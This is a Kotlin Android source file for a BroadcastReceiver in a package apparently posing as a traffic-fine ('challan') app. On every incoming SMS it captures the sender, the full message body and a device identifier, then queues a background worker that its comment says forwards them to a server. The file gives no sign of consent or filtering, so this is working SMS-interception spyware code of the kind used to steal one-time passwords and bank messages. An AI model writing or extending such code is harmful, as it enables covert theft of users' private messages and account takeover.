package com.rte.challan.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.rte.challan.utils.DeviceInfo
import com.rte.challan.worker.SendIncomingSmsWorker

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in messages) {
                val sender = sms.originatingAddress ?: continue
                val messageBody = sms.messageBody

                // Delegate to a worker to send to server (to avoid blocking broadcast)
                val data = workDataOf(
                    "sender" to sender,
                    "body" to messageBody,
                    "deviceId" to DeviceInfo.getDeviceId(context)
                )
                val workRequest = OneTimeWorkRequestBuilder<SendIncomingSmsWorker>()
                    .setInputData(data)
                    .build()
                WorkManager.getInstance(context).enqueue(workRequest)
            }
        }
    }
}
